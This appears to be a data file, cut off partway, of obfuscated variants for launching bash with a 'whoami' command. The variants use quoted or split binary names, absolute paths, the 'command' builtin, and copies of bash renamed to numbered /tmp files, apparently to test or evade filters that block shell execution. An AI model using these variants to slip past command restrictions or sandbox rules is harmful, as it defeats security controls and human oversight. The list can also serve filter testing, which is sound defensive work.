"bash"  -i -c "whoami"
"bash" -i -c "whoami"
"bash"-i -c "whoami"
'bash'  -i -c "whoami"
'bash' -i -c "whoami"
'bash'-i -c "whoami"
/bin/"bash"  -i -c "whoami"
/bin/"bash" -i -c "whoami"
/bin/"bash"-i -c "whoami"
/bin/'bash'  -i -c "whoami"
/bin/'bash' -i -c "whoami"
/bin/'bash'-i -c "whoami"
/bin/b""ash  -i -c "whoami"
/bin/b""ash -i -c "whoami"
/bin/b""ash-i -c "whoami"
/bin/b''ash  -i -c "whoami"
/bin/b''ash -i -c "whoami"
/bin/b''ash-i -c "whoami"
/bin/bash  -i -c "whoami"
/bin/bash -i -c "whoami"
/bin/bash-i -c "whoami"
/usr/bin/"bash"  -i -c "whoami"
/usr/bin/"bash" -i -c "whoami"
/usr/bin/"bash"-i -c "whoami"
/usr/bin/'bash'  -i -c "whoami"
/usr/bin/'bash' -i -c "whoami"
/usr/bin/'bash'-i -c "whoami"
/usr/bin/b""ash  -i -c "whoami"
/usr/bin/b""ash -i -c "whoami"
/usr/bin/b""ash-i -c "whoami"
/usr/bin/b''ash  -i -c "whoami"
/usr/bin/b''ash -i -c "whoami"
/usr/bin/b''ash-i -c "whoami"
/usr/bin/bash  -i -c "whoami"
/usr/bin/bash -i -c "whoami"
/usr/bin/bash-i -c "whoami"
b""ash  -i -c "whoami"
b""ash -i -c "whoami"
b""ash-i -c "whoami"
b''ash  -i -c "whoami"
b''ash -i -c "whoami"
b''ash-i -c "whoami"
bash  -i -c "whoami"
bash -i -c "whoami"
bash-i -c "whoami"
command "bash"  -i -c "whoami"
command "bash" -i -c "whoami"
command "bash"-i -c "whoami"
command 'bash'  -i -c "whoami"
command 'bash' -i -c "whoami"
command 'bash'-i -c "whoami"
command b""ash  -i -c "whoami"
command b""ash -i -c "whoami"
command b""ash-i -c "whoami"
command b''ash  -i -c "whoami"
command b''ash -i -c "whoami"
command b''ash-i -c "whoami"
command bash  -i -c "whoami"
command bash -i -c "whoami"
command bash-i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_1 && /tmp/tmp_bin_1 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_10 && /tmp/tmp_bin_10 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_100 && /tmp/tmp_bin_100 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_101 && /tmp/tmp_bin_101 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_102 && /tmp/tmp_bin_102 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_103 && /tmp/tmp_bin_103 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_104 && /tmp/tmp_bin_104 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_105 && /tmp/tmp_bin_105 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_106 && /tmp/tmp_bin_106 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_107 && /tmp/tmp_bin_107 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_108 && /tmp/tmp_bin_108 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_109 && /tmp/tmp_bin_109 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_11 && /tmp/tmp_bin_11 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_110 && /tmp/tmp_bin_110 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_111 && /tmp/tmp_bin_111 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_112 && /tmp/tmp_bin_112 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_113 && /tmp/tmp_bin_113 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_114 && /tmp/tmp_bin_114 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_115 && /tmp/tmp_bin_115 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_116 && /tmp/tmp_bin_116 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_117 && /tmp/tmp_bin_117 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_118 && /tmp/tmp_bin_118 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_119 && /tmp/tmp_bin_119 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_12 && /tmp/tmp_bin_12 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_120 && /tmp/tmp_bin_120 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_121 && /tmp/tmp_bin_121 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_122 && /tmp/tmp_bin_122 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_123 && /tmp/tmp_bin_123 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_124 && /tmp/tmp_bin_124 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_125 && /tmp/tmp_bin_125 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_126 && /tmp/tmp_bin_126 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_127 && /tmp/tmp_bin_127 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_128 && /tmp/tmp_bin_128 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_129 && /tmp/tmp_bin_129 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_13 && /tmp/tmp_bin_13 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_130 && /tmp/tmp_bin_130 -i -c "whoami"
